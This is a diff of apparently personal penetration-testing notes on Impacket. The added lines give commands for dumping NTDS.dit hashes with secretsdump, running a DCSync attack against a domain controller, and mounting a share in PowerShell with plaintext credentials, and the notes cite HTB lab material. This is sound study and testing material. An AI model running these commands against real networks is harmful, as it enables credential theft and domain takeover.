@@ -2,7 +2,7 @@
 
 WARNING impacket does not handle NTFS well - [Ippsec Blackfield HTB](https://www.youtube.com/watch?v=IfCysW0Od8w)
 
-From [Impacket Github](https://github.com/SecureAuthCorp/impacket)
+From [Impacket Github](https://github.com/SecureAuthCorp/impacket) or [secureAuth](https://www.secureauth.com/labs/open-source-tools/impacket/) for a full listing and detailed discription of each tool
 *"Impacket is a collection of Python classes for working with network protocols."*
 
 ## What protocols are featured?
@@ -130,9 +130,17 @@ secretsdump.py -sam $exfiled_sam -system $exfiled_system LOCAL
 
 Dump a NTDS hashes
 ```bash
-impacket-secretsdump -system system -security security LOCAL
+impacket-secretsdump -system system -security security -ntds ntds.dit LOCAL
 ```
 [medium](https://bond-o.medium.com/extracting-and-cracking-ntds-dit-2b266214f277)
+
+Perform a [[DC-Sync-Attack]]
+```bash
+secretsdump -just-dc $domain/$user@$DC-ip
+# For just ntlms 
+-just-dc-ntlm 
+```
+
 
 ## smbexec.py
 A similar to `psexec.py` without using [RemComSvc](https://github.com/kavika13/RemCom). Instantiates a local smbserver to then receive the output of commands.
@@ -156,7 +164,7 @@ On remote:
 ```powershell
 $pass = convertto-securestring 'pass' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('user', $pass)
-New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root \\$IP\$sharename
+New-PSDrive -Name "$share" -PSProvider FileSystem -Credential $cred -Root \\$IP\$sharename
 ```
 
 ```powershell
@@ -182,3 +190,4 @@ wmiexec.py $domain/$username:$password@$IP <command>
 [Haax9](https://cheatsheet.haax.fr/windows-systems/exploitation/remote_execution_techniques/)
 [RemComSvc](https://github.com/kavika13/RemCom)
 [ntds extracting and rcacking medium](https://bond-o.medium.com/extracting-and-cracking-ntds-dit-2b266214f277)
+[secureAuth](https://www.secureauth.com/labs/open-source-tools/impacket/)
